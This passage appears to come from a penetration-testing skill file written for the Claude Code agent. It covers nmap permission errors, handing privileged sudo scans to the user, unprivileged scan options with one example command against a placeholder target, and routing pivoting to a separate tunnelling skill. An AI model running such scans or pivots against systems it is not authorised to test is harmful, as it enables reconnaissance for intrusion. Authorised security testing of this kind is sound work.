→ STOP. Route to **pivoting-tunneling** — call `get_skill("pivoting-tunneling")` and follow its instructions to bring proper tools
through to the pivot. Do not configure tunnels inline.

### Permission errors running nmap

Most scan types (`-sS`, `-sU`, `-O`) require root. Claude Code cannot run `sudo`
commands — use the handoff protocol described in the **Privileged Commands**
section above. Present the full `sudo nmap ...` command to the user with an
output flag (`-oA`/`-oG`), wait for them to run it, then read the output file.

For scans that work without root:
- `-sT` (connect scan) — slower and more detectable but unprivileged
- `-sV` (service detection) — works unprivileged
- NSE scripts that don't require raw sockets

```bash
# Unprivileged scan (Claude can execute directly)
nmap -sT -sV --top-ports 1000 -oA unprivileged_HOSTNAME TARGET_IP
```
